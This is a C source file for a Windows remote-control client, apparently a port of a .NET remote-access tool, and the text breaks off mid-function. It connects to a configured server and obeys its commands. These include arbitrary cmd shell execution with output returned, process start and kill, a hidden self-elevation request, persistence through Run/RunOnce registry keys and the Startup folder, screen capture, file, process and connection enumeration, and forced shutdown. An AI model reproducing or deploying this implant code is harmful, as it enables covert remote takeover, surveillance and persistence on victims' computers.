/**
 * remote_client.c
 * Connects to server from config.json, sends ClientIdentification (protobuf), reads ClientIdentificationResult.
 * Uses existing protobuf-based protocol; no builder; config from config.json.
 */
#include "pch.h"
#include "remote_config.h"
#include "remote_protocol.h"
#include "remote_transport.h"
#include "remote_client.h"
#include "remote_log.h"
#include "remote_desktop.h"
#include <ShlObj.h>
#include <Shellapi.h>
#include <PowrProf.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "powrprof.lib")
#include <stdlib.h>
#include <string.h>

static volatile long g_client_stop = 0;
static volatile long g_request_reconnect = 0;

/* Single active upload slot (server uploading file to client). */
typedef struct { int id; HANDLE hFile; char path[MAX_PATH]; long long fileSize; long long transferred; int active; } upload_slot_t;
static upload_slot_t g_upload = { 0 };

static void upload_close(void) {
    if (g_upload.hFile != INVALID_HANDLE_VALUE && g_upload.hFile != NULL) {
        CloseHandle(g_upload.hFile);
        g_upload.hFile = INVALID_HANDLE_VALUE;
    }
    g_upload.active = 0;
}

/* Generate a simple 64-char id (server requires Id.Length == 64). */
static void make_id(char* out) {
    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < 64; i++)
        out[i] = hex[rand() % 16];
    out[64] = '\0';
}

void remote_client_stop(void) {
    InterlockedExchange(&g_client_stop, 1);
}

void remote_client_run(void) {
    remote_config_t config;
    if (!remote_config_load(&config) || !config.valid) {
        remote_log("config load failed; check config.json next to process exe");
        return;
    }
    remote_log("config loaded: %s:%u", config.server_address, (unsigned)config.server_port);

    for (;;) {
        if (InterlockedCompareExchange(&g_client_stop, 1, 1) == 1)
            break;

        remote_log("connecting to %s:%u ...", config.server_address, (unsigned)config.server_port);
        remote_transport_handle_t transport = remote_transport_connect(config.server_address, config.server_port);
        if (!transport) {
            remote_log("transport connect failed");
            Sleep(5000);
            continue;
        }
        remote_log("TCP+TLS connected");

        char id_buf[65];
        make_id(id_buf);

        remote_identification_t ident = { 0 };
        ident.version = "1.0";
        ident.operating_system = "Windows";
        ident.account_type = "User";
        ident.country = "";
        ident.country_code = "";
        ident.image_index = 0;
        ident.id = id_buf;
        ident.username = "User";
        ident.pc_name = "PC";
        ident.tag = "";
        ident.encryption_key = "";
        ident.signature = NULL;
        ident.signature_len = 0;

        /* Encode ClientIdentification body, then wrap with IMessage subtype (same as reference .NET client). */
        unsigned char payload_buf[2048];
        unsigned int body_len = remote_proto_encode_identification(&ident, payload_buf, sizeof(payload_buf));
        if (body_len == 0) {
            remote_log("encode identification failed");
            remote_transport_close(transport);
            Sleep(5000);
            continue;
        }
        unsigned char frame_buf[2100];
        unsigned int full_payload_len = remote_proto_prepend_imessage(frame_buf + 4, sizeof(frame_buf) - 4,
            REMOTE_SUBTYPE_ClientIdentification, payload_buf, body_len);
        if (full_payload_len == 0) {
            remote_log("prepend IMessage failed");
            remote_transport_close(transport);
            Sleep(5000);
            continue;
        }
        remote_log("identification encoded, %u bytes (IMessage subtype %d + body)", full_payload_len, REMOTE_SUBTYPE_ClientIdentification);

        unsigned int frame_len = remote_proto_write_frame(frame_buf + 4, full_payload_len, frame_buf, sizeof(frame_buf));
        remote_log("[handshake] sending identification frame: %u bytes (4-byte length + %u payload)", frame_len, full_payload_len);
        if (frame_len == 0 || !remote_transport_send(transport, frame_buf, frame_len)) {
            remote_log("[handshake] send identification failed");
            remote_transport_close(transport);
            Sleep(5000);
            continue;
        }
        remote_log("identification sent");

        /* Read 4-byte length then payload. */
        remote_log("[handshake] waiting for server response (4-byte length + payload)");
        unsigned char header[4];
        if (!remote_transport_recv(transport, header, 4)) {
            remote_log("[handshake] recv response header failed");
            remote_transport_close(transport);
            Sleep(5000);
            continue;
        }
        unsigned int resp_len = 0;
        if (!remote_proto_read_frame_length(header, &resp_len) || resp_len > 1024) {
            remote_log("[handshake] invalid response length: %u", resp_len);
            remote_transport_close(transport);
            Sleep(5000);
            continue;
        }
        remote_log("[handshake] response length from server: %u bytes", resp_len);
        unsigned char* resp_payload = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, resp_len);
        if (!resp_payload) {
            remote_log("[handshake] heap alloc failed for response");
            remote_transport_close(transport);
            Sleep(5000);
            continue;
        }
        if (!remote_transport_recv(transport, resp_payload, resp_len)) {
            remote_log("[handshake] recv response payload failed");
            HeapFree(GetProcessHeap(), 0, resp_payload);
            remote_transport_close(transport);
            Sleep(5000);
            continue;
        }
        remote_log_hex("[handshake] response payload", resp_payload, resp_len);

        int accepted = remote_proto_decode_identification_result(resp_payload, resp_len);
        HeapFree(GetProcessHeap(), 0, resp_payload);

        if (!accepted) {
            remote_log("server rejected identification");
            remote_transport_close(transport);
            Sleep(5000);
            continue;
        }
        remote_log("identification accepted; entering message loop");

        /* Message loop: read frames (4-byte length + payload), dispatch by subtype. */
        {
            unsigned char header[4];
            /* 128KB buffer: FileTransferChunk from server can be ~66KB (65535 data + envelope). */
            unsigned char payload_buf[128 * 1024];
            const unsigned int max_payload = (unsigned int)sizeof(payload_buf);
            while (InterlockedCompareExchange(&g_client_stop, 1, 1) != 1) {
                if (InterlockedCompareExchange(&g_request_reconnect, 1, 1) == 1) {
                    remote_log("[loop] reconnect requested; breaking to reconnect");
                    break;
                }
                if (!remote_transport_recv(transport, header, 4)) {
                    remote_log("[loop] recv header failed; disconnecting");
                    break;
                }
                unsigned int payload_len = 0;
                if (!remote_proto_read_frame_length(header, &payload_len) || payload_len > max_payload) {
                    remote_log("[loop] invalid frame length %u; disconnecting", payload_len);
                    break;
                }
                if (payload_len == 0) {
                    remote_log("[loop] empty payload; continuing");
                    continue;
                }
                if (!remote_transport_recv(transport, payload_buf, payload_len)) {
                    remote_log("[loop] recv payload failed; disconnecting");
                    break;
                }

                /* Server sends IMessage: 0x08 <subtype> [body]. If payload doesn't start with 0x08, prepend it (server may send raw subtype+body). */
                const unsigned char* dispatch_buf = payload_buf;
                unsigned int dispatch_len = payload_len;
                unsigned char prefixed_buf[260];
                if (payload_len >= 1 && payload_len <= sizeof(prefixed_buf) - 1 && payload_buf[0] != 0x08) {
                    prefixed_buf[0] = 0x08;
                    memcpy(prefixed_buf + 1, payload_buf, payload_len);
                    dispatch_buf = prefixed_buf;
                    dispatch_len = payload_len + 1;
                    remote_log("[loop] payload missing 0x08 prefix; prepended for dispatch (len now %u)", dispatch_len);
                }

                if (dispatch_len >= 2 && dispatch_buf[0] == 0x08) {
                    unsigned int consumed = 0;
                    unsigned int subtype = remote_proto_read_subtype(dispatch_buf, dispatch_len, &consumed);

                    if (subtype == REMOTE_SUBTYPE_GetMonitors) {
                        int count = GetSystemMetrics(SM_CMONITORS);
                        if (count <= 0) count = 1;
                        remote_log("[loop] handling GetMonitors -> %d display(s)", count);
                        {
                            unsigned char resp_body[32];
                            unsigned int resp_body_len = remote_proto_encode_get_monitors_response(count, resp_body, sizeof(resp_body));
                            if (resp_body_len > 0) {
                                unsigned char full_msg[128];
                                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
                                    REMOTE_SUBTYPE_GetMonitorsResponse, resp_body, resp_body_len);
                                if (full_len > 0) {
                                    unsigned char frame[128];
                                    unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                    int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
                                    remote_log("[loop] GetMonitorsResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                } else
                                    remote_log("[loop] GetMonitorsResponse prepend_imessage failed");
                            } else
                                remote_log("[loop] GetMonitorsResponse encode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_GetDrives) {
                        remote_log("[loop] handling GetDrives");
                        {
                            unsigned char resp_body[512];
                            unsigned int resp_body_len = remote_proto_encode_get_drives_response(resp_body, sizeof(resp_body));
                            if (resp_body_len > 0) {
                                unsigned char full_msg[600];
                                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
                                    REMOTE_SUBTYPE_GetDrivesResponse, resp_body, resp_body_len);
                                if (full_len > 0) {
                                    unsigned char frame[604];
                                    unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                    int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
                                    remote_log("[loop] GetDrivesResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                } else
                                    remote_log("[loop] GetDrivesResponse prepend_imessage failed");
                            } else
                                remote_log("[loop] GetDrivesResponse encode failed (no drives?)");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_DoProcessEnd) {
                        remote_log("[loop] handling DoProcessEnd");
                        {
                            const unsigned char* body = dispatch_buf + consumed;
                            unsigned int body_len = dispatch_len - consumed;
                            int pid = 0;
                            if (remote_proto_decode_do_process_end(body, body_len, &pid)) {
                                int ok = 0;
                                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)pid);
                                if (hProc) {
                                    if (TerminateProcess(hProc, 0)) ok = 1;
                                    CloseHandle(hProc);
                                }
                                unsigned char resp_body[32];
                                unsigned int resp_len = remote_proto_encode_do_process_response(1, ok, resp_body, sizeof(resp_body));
                                if (resp_len > 0) {
                                    unsigned char full_msg[64];
                                    unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
                                        REMOTE_SUBTYPE_DoProcessResponse, resp_body, resp_len);
                                    if (full_len > 0) {
                                        unsigned char frame[68];
                                        unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                        remote_transport_send(transport, frame, frame_len);
                                        remote_log("[loop] DoProcessResponse (End) sent: result=%s", ok ? "OK" : "FAIL");
                                    }
                                }
                            } else
                                remote_log("[loop] DoProcessEnd decode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_DoProcessStart) {
                        remote_log("[loop] handling DoProcessStart");
                        {
                            const unsigned char* body = dispatch_buf + consumed;
                            unsigned int body_len = dispatch_len - consumed;
                            char file_path[MAX_PATH];
                            int is_update = 0;
                            if (remote_proto_decode_do_process_start(body, body_len, file_path, sizeof(file_path), &is_update)) {
                                int ok = 0;
                                if (file_path[0]) {
                                    HINSTANCE r = ShellExecuteA(NULL, "open", file_path, NULL, NULL, SW_SHOW);
                                    ok = ((UINT_PTR)r > 32) ? 1 : 0;
                                }
                                if (is_update) ok = 0;
                                unsigned char resp_body[32];
                                unsigned int resp_len = remote_proto_encode_do_process_response(0, ok, resp_body, sizeof(resp_body));
                                if (resp_len > 0) {
                                    unsigned char full_msg[64];
                                    unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
                                        REMOTE_SUBTYPE_DoProcessResponse, resp_body, resp_len);
                                    if (full_len > 0) {
                                        unsigned char frame[68];
                                        unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                        remote_transport_send(transport, frame, frame_len);
                                        remote_log("[loop] DoProcessResponse (Start) sent: result=%s", ok ? "OK" : "FAIL");
                                    }
                                }
                            } else
                                remote_log("[loop] DoProcessStart decode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_DoShellExecute) {
                        remote_log("[loop] handling DoShellExecute");
                        {
                            const unsigned char* body = dispatch_buf + consumed;
                            unsigned int body_len = dispatch_len - consumed;
                            char command_buf[4096];
                            if (remote_proto_decode_do_shell_execute(body, body_len, command_buf, sizeof(command_buf))) {
                                int is_error = 0;
                                char output_buf[65536];
                                output_buf[0] = '\0';
                                if (strcmp(command_buf, "exit") == 0) {
                                    strcpy_s(output_buf, sizeof(output_buf), "\n>> Session closed\n");
                                } else if (command_buf[0]) {
                                    char cmd_line[4200];
                                    _snprintf_s(cmd_line, sizeof(cmd_line), _TRUNCATE, "cmd /c %s", command_buf);
                                    FILE* fp = _popen(cmd_line, "rt");
                                    if (fp) {
                                        size_t total = 0;
                                        while (total < sizeof(output_buf) - 256) {
                                            size_t cap = sizeof(output_buf) - 1 - total;
                                            if (fgets(output_buf + total, (int)cap, fp) == NULL) break;
                                            total = strlen(output_buf);
                                        }
                                        output_buf[sizeof(output_buf) - 1] = '\0';
                                        _pclose(fp);
                                    } else {
                                        strcpy_s(output_buf, sizeof(output_buf), "\n>> Failed to run command\n");
                                        is_error = 1;
                                    }
                                }
                                unsigned char resp_body[65600];
                                unsigned int resp_len = remote_proto_encode_do_shell_execute_response(output_buf, is_error, resp_body, sizeof(resp_body));
                                if (resp_len > 0) {
                                    unsigned char* full_msg = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 8 + resp_len);
                                    if (full_msg) {
                                        unsigned int full_len = remote_proto_prepend_imessage(full_msg, 8 + resp_len,
                                            REMOTE_SUBTYPE_DoShellExecuteResponse, resp_body, resp_len);
                                        if (full_len > 0) {
                                            unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 4 + full_len);
                                            if (frame_buf) {
                                                unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame_buf, 4 + full_len);
                                                int sent = (frame_len > 0 && remote_transport_send(transport, frame_buf, frame_len));
                                                HeapFree(GetProcessHeap(), 0, frame_buf);
                                                remote_log("[loop] DoShellExecuteResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                            }
                                        }
                                        HeapFree(GetProcessHeap(), 0, full_msg);
                                    }
                                }
                            } else
                                remote_log("[loop] DoShellExecute decode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_GetProcesses) {
                        remote_log("[loop] handling GetProcesses");
                        {
                            unsigned char resp_body[65536];
                            unsigned int resp_body_len = remote_proto_encode_get_processes_response(resp_body, sizeof(resp_body));
                            if (resp_body_len > 0) {
                                unsigned char full_msg[65600];
                                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
                                    REMOTE_SUBTYPE_GetProcessesResponse, resp_body, resp_body_len);
                                if (full_len > 0) {
                                    unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 4 + full_len);
                                    if (frame_buf) {
                                        unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame_buf, 4 + full_len);
                                        int sent = (frame_len > 0 && remote_transport_send(transport, frame_buf, frame_len));
                                        HeapFree(GetProcessHeap(), 0, frame_buf);
                                        remote_log("[loop] GetProcessesResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                    } else
                                        remote_log("[loop] GetProcessesResponse heap alloc failed");
                                } else
                                    remote_log("[loop] GetProcessesResponse prepend_imessage failed");
                            } else
                                remote_log("[loop] GetProcessesResponse encode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_GetConnections) {
                        remote_log("[loop] handling GetConnections");
                        {
                            unsigned char resp_body[65536];
                            unsigned int resp_body_len = remote_proto_encode_get_connections_response(resp_body, sizeof(resp_body));
                            if (resp_body_len > 0) {
                                unsigned char* full_msg = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 8 + resp_body_len);
                                if (full_msg) {
                                    unsigned int full_len = remote_proto_prepend_imessage(full_msg, 8 + resp_body_len,
                                        REMOTE_SUBTYPE_GetConnectionsResponse, resp_body, resp_body_len);
                                    if (full_len > 0) {
                                        unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 4 + full_len);
                                        if (frame_buf) {
                                            unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame_buf, 4 + full_len);
                                            int sent = (frame_len > 0 && remote_transport_send(transport, frame_buf, frame_len));
                                            HeapFree(GetProcessHeap(), 0, frame_buf);
                                            remote_log("[loop] GetConnectionsResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                        }
                                    }
                                    HeapFree(GetProcessHeap(), 0, full_msg);
                                }
                            } else
                                remote_log("[loop] GetConnectionsResponse encode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_DoAskElevate) {
                        remote_log("[loop] handling DoAskElevate");
                        if (!IsUserAnAdmin()) {
                            char exe_path[MAX_PATH];
                            if (GetModuleFileNameA(NULL, exe_path, MAX_PATH) && exe_path[0]) {
                                HINSTANCE r = ShellExecuteA(NULL, "runas", exe_path, NULL, NULL, SW_HIDE);
                                if ((UINT_PTR)r > 32) {
                                    InterlockedExchange(&g_client_stop, 1);
                                    remote_transport_close(transport);
                                }
                            }
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_DoClientDisconnect) {
                        remote_log("[loop] handling DoClientDisconnect");
                        InterlockedExchange(&g_client_stop, 1);
                        remote_transport_close(transport);
                    }
                    else if (subtype == REMOTE_SUBTYPE_DoClientReconnect) {
                        remote_log("[loop] handling DoClientReconnect");
                        InterlockedExchange(&g_request_reconnect, 1);
                    }
                    else if (subtype == REMOTE_SUBTYPE_DoShutdownAction) {
                        remote_log("[loop] handling DoShutdownAction");
                        {
                            const unsigned char* body = dispatch_buf + consumed;
                            unsigned int body_len = dispatch_len - consumed;
                            unsigned int action = 0;
                            if (remote_proto_decode_do_shutdown_action(body, body_len, &action)) {
                                switch (action) {
                                    case 0: /* Shutdown */
                                        ShellExecuteA(NULL, "open", "shutdown", "/s /t 0", NULL, SW_HIDE);
                                        break;
                                    case 1: /* Restart */
                                        ShellExecuteA(NULL, "open", "shutdown", "/r /t 0", NULL, SW_HIDE);
                                        break;
                                    case 2: /* Standby */
                                        SetSuspendState(FALSE, TRUE, TRUE);
                                        break;
                                }
                            }
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_DoCloseConnection) {
                        remote_log("[loop] handling DoCloseConnection");
                        {
                            const unsigned char* body = dispatch_buf + consumed;
                            unsigned int body_len = dispatch_len - consumed;
                            char local_addr[64], remote_addr[64];
                            unsigned short local_port = 0, remote_port = 0;
                            if (remote_proto_decode_do_close_connection(body, body_len,
                                    local_addr, sizeof(local_addr), &local_port,
                                    remote_addr, sizeof(remote_addr), &remote_port)) {
                                int ok = remote_proto_close_tcp_connection(local_addr, local_port, remote_addr, remote_port);
                                remote_log("[loop] DoCloseConnection result=%s (admin required)", ok ? "OK" : "FAIL");
                                if (ok) {
                                    unsigned char resp_body[65536];
                                    unsigned int resp_body_len = remote_proto_encode_get_connections_response(resp_body, sizeof(resp_body));
                                    if (resp_body_len > 0) {
                                        unsigned char* full_msg = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 8 + resp_body_len);
                                        if (full_msg) {
                                            unsigned int full_len = remote_proto_prepend_imessage(full_msg, 8 + resp_body_len,
                                                REMOTE_SUBTYPE_GetConnectionsResponse, resp_body, resp_body_len);
                                            if (full_len > 0) {
                                                unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 4 + full_len);
                                                if (frame_buf) {
                                                    unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame_buf, 4 + full_len);
                                                    remote_transport_send(transport, frame_buf, frame_len);
                                                    HeapFree(GetProcessHeap(), 0, frame_buf);
                                                }
                                            }
                                            HeapFree(GetProcessHeap(), 0, full_msg);
                                        }
                                    }
                                }
                            } else {
                                remote_log("[loop] DoCloseConnection decode failed (body_len=%u)", (unsigned)body_len);
                                remote_log_hex("DoCloseConnection body", body, body_len > 64 ? 64 : body_len);
                            }
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_DoStartupItemAdd) {
                        remote_log("[loop] handling DoStartupItemAdd");
                        {
                            const unsigned char* body = dispatch_buf + consumed;
                            unsigned int body_len = dispatch_len - consumed;
                            char name_buf[260], path_buf[MAX_PATH];
                            unsigned int type_val = 0;
                            if (remote_proto_decode_do_startup_item_add(body, body_len, name_buf, sizeof(name_buf), path_buf, sizeof(path_buf), &type_val)) {
                                int ok = 0;
                                HKEY hive = NULL;
                                const char* key_path = NULL;
                                switch (type_val) {
                                    case 0: hive = HKEY_LOCAL_MACHINE; key_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"; break;
                                    case 1: hive = HKEY_LOCAL_MACHINE; key_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"; break;
                                    case 2: hive = HKEY_CURRENT_USER; key_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"; break;
                                    case 3: hive = HKEY_CURRENT_USER; key_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"; break;
                                    case 5: hive = HKEY_LOCAL_MACHINE; key_path = "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"; break;
                                    case 6: hive = HKEY_LOCAL_MACHINE; key_path = "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"; break;
                                    case 4: {
                                        char startup_path[MAX_PATH];
                                        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
                                            char lnk_path[MAX_PATH];
                                            _snprintf_s(lnk_path, sizeof(lnk_path), _TRUNCATE, "%s\\%s.url", startup_path, name_buf);
                                            FILE* f = NULL;
                                            if (fopen_s(&f, lnk_path, "w") == 0 && f) {
                                                char path_for_url[MAX_PATH];
                                                size_t k;
                                                for (k = 0; path_buf[k] && k < sizeof(path_for_url) - 1; k++)
                                                    path_for_url[k] = (path_buf[k] == '\\') ? '/' : path_buf[k];
                                                path_for_url[k] = '\0';
                                                fprintf(f, "[InternetShortcut]\r\nURL=file:///%s\r\nIconIndex=0\r\nIconFile=%s\r\n", path_for_url, path_for_url);
                                                fclose(f);
                                                ok = 1;
                                            }
                                        }
                                        break;
                                    }
                                    default: break;
                                }
                                if (key_path) {
                                    HKEY hKey;
                                    if (RegOpenKeyExA(hive, key_path, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                                        if (RegSetValueExA(hKey, name_buf, 0, REG_SZ, (const BYTE*)path_buf, (DWORD)(strlen(path_buf) + 1)) == ERROR_SUCCESS)
                                            ok = 1;
                                        RegCloseKey(hKey);
                                    }
                                }
                                remote_log("[loop] DoStartupItemAdd result=%s", ok ? "OK" : "FAIL");
                            } else {
                                remote_log("[loop] DoStartupItemAdd decode failed (body_len=%u)", (unsigned)body_len);
                                remote_log_hex("DoStartupItemAdd body", body, body_len > 64 ? 64 : body_len);
                            }
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_DoStartupItemRemove) {
                        remote_log("[loop] handling DoStartupItemRemove");
                        {
                            const unsigned char* body = dispatch_buf + consumed;
                            unsigned int body_len = dispatch_len - consumed;
                            char name_buf[260];
                            unsigned int type_val = 0;
                            if (remote_proto_decode_do_startup_item_remove(body, body_len, name_buf, sizeof(name_buf), &type_val)) {
                                int ok = 0;
                                HKEY hive = NULL;
                                const char* key_path = NULL;
                                switch (type_val) {
                                    case 0: hive = HKEY_LOCAL_MACHINE; key_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"; break;
                                    case 1: hive = HKEY_LOCAL_MACHINE; key_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"; break;
                                    case 2: hive = HKEY_CURRENT_USER; key_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"; break;
                                    case 3: hive = HKEY_CURRENT_USER; key_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"; break;
                                    case 5: hive = HKEY_LOCAL_MACHINE; key_path = "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"; break;
                                    case 6: hive = HKEY_LOCAL_MACHINE; key_path = "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"; break;
                                    case 4: {
                                        char startup_path[MAX_PATH];
                                        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
                                            char full_path[MAX_PATH];
                                            _snprintf_s(full_path, sizeof(full_path), _TRUNCATE, "%s\\%s", startup_path, name_buf);
                                            if (DeleteFileA(full_path)) ok = 1;
                                        }
                                        break;
                                    }
                                    default: break;
                                }
                                if (key_path) {
                                    HKEY hKey;
                                    if (RegOpenKeyExA(hive, key_path, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                                        if (RegDeleteValueA(hKey, name_buf) == ERROR_SUCCESS) ok = 1;
                                        RegCloseKey(hKey);
                                    }
                                }
                                remote_log("[loop] DoStartupItemRemove result=%s", ok ? "OK" : "FAIL");
                            } else {
                                remote_log("[loop] DoStartupItemRemove decode failed (body_len=%u)", (unsigned)body_len);
                                remote_log_hex("DoStartupItemRemove body", body, body_len > 64 ? 64 : body_len);
                            }
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_GetStartupItems) {
                        remote_log("[loop] handling GetStartupItems");
                        {
                            unsigned char resp_body[8192];
                            unsigned int resp_body_len = remote_proto_encode_get_startup_items_response(resp_body, sizeof(resp_body));
                            if (resp_body_len > 0) {
                                unsigned char full_msg[8300];
                                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
                                    REMOTE_SUBTYPE_GetStartupItemsResponse, resp_body, resp_body_len);
                                if (full_len > 0) {
                                    unsigned char frame[8304];
                                    unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                    int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
                                    remote_log("[loop] GetStartupItemsResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                } else
                                    remote_log("[loop] GetStartupItemsResponse prepend_imessage failed");
                            } else
                                remote_log("[loop] GetStartupItemsResponse encode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_GetSystemInfo) {
                        remote_log("[loop] handling GetSystemInfo");
                        {
                            unsigned char resp_body[512];
                            unsigned int resp_body_len = remote_proto_encode_get_system_info_response(resp_body, sizeof(resp_body));
                            if (resp_body_len > 0) {
                                unsigned char full_msg[600];
                                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
                                    REMOTE_SUBTYPE_GetSystemInfoResponse, resp_body, resp_body_len);
                                if (full_len > 0) {
                                    unsigned char frame[604];
                                    unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                    int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
                                    remote_log("[loop] GetSystemInfoResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                } else
                                    remote_log("[loop] GetSystemInfoResponse prepend_imessage failed");
                            } else
                                remote_log("[loop] GetSystemInfoResponse encode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_GetDesktop) {
                        {
                            static int prev_quality = -1, prev_display = -1;
                            const unsigned char* body = dispatch_buf + consumed;
                            unsigned int body_len = dispatch_len - consumed;
                            int quality = 75, display_index = 0, create_new = 0;
                            if (remote_proto_decode_get_desktop(body, body_len, &quality, &display_index, &create_new)) {
                                if (create_new || prev_quality != quality || prev_display != display_index)
                                    remote_desktop_reset();
                                prev_quality = quality;
                                prev_display = display_index;
                                unsigned int img_len = 0;
                                int w = 0, h = 0;
                                unsigned char* img_buf = remote_desktop_capture(display_index, quality, &img_len, &w, &h);
                                if (img_buf && img_len >= 4) {
                                    unsigned int body_max = img_len + 128;
                                    unsigned char* body_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, body_max);
                                    if (body_buf) {
                                        unsigned int resp_body_len = remote_proto_encode_get_desktop_response(img_buf, img_len, quality, display_index, w, h, body_buf, body_max);
                                        HeapFree(GetProcessHeap(), 0, img_buf);
                                        if (resp_body_len > 0) {
                                            unsigned int full_max = resp_body_len + 8;
                                            unsigned char* full_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, full_max);
                                            if (full_buf) {
                                                unsigned int full_len = remote_proto_prepend_imessage(full_buf, full_max, REMOTE_SUBTYPE_GetDesktopResponse, body_buf, resp_body_len);
                                                HeapFree(GetProcessHeap(), 0, body_buf);
                                                if (full_len > 0) {
                                                    unsigned int frame_max = 4 + full_len;
                                                    unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, frame_max);
                                                    if (frame_buf) {
                                                        unsigned int frame_len = remote_proto_write_frame(full_buf, full_len, frame_buf, frame_max);
                                                        remote_transport_send(transport, frame_buf, frame_len);
                                                        HeapFree(GetProcessHeap(), 0, frame_buf);
                                                    }
                                                }
                                                HeapFree(GetProcessHeap(), 0, full_buf);
                                            } else
                                                HeapFree(GetProcessHeap(), 0, body_buf);
                                        } else
                                            HeapFree(GetProcessHeap(), 0, body_buf);
                                    } else
                                        HeapFree(GetProcessHeap(), 0, img_buf);
                                } else {
                                    if (img_buf) HeapFree(GetProcessHeap(), 0, img_buf);
                                    remote_log("[loop] GetDesktop capture failed");
                                }
                            } else
                                remote_log("[loop] GetDesktop decode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_GetDirectory) {
                        remote_log("[loop] handling GetDirectory");
                        {
                            const unsigned char* body = dispatch_buf + consumed;
                            unsigned int body_len = dispatch_len - consumed;
                            char path_buf[MAX_PATH];
                            if (remote_proto_decode_get_directory(body, body_len, path_buf, sizeof(path_buf))) {
                                unsigned char resp_body[16384];
                                unsigned int resp_body_len = remote_proto_encode_get_directory_response(path_buf, resp_body, sizeof(resp_body));
                                if (resp_body_len > 0) {
                                    unsigned char full_msg[16400];
                                    unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
                                        REMOTE_SUBTYPE_GetDirectoryResponse, resp_body, resp_body_len);
                                    if (full_len > 0) {
                                        unsigned char frame[16404];
                                        unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                        int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
                                        remote_log("[loop] GetDirectoryResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                    } else
